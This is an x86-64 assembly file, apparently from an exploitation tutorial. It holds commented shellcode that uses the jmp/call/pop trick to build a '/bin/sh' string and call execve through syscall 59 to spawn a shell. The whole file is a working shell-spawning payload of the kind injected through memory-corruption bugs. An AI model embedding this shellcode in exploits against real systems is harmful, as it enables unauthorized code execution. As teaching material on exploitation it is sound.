global _start

section .text
_start:

    jmp two     ; Jump down to the bottom for the call trick.
one:
    ; 64 bit System V ABI 
    ; system calls use: RDI/RSI/RDX/R10/R8/R9

    ; int execve(const char *filename, char *const argv [], char *const envp[])
    ;                     RDI                 RSI                RDX

    pop rdi           ; pop addr of the string into rdi
    xor rax, rax      ; Put 0 into rax.
    mov [rdi+7], byte ah   ; Null terminate the /bin/sh string.
    mov [rdi+8], rdi  ; Put addr from rdi where the AAAAAAAA is.
    mov [rdi+16], rax ; Put 64-bit null terminator where the BBBBBBBB is.
    lea rsi, [rdi+8]  ; Load the address of [rdi+8] into rsi for argv ptr.
    lea rdx, [rdi+16] ; rdx = rdi + 16, which is the envp ptr.
    add rax, 59       ; Syscall #59
    syscall

two:
    call one          ; Use a call to get string address.
    db '/bin/shXAAAAAAAABBBBBBBB'     
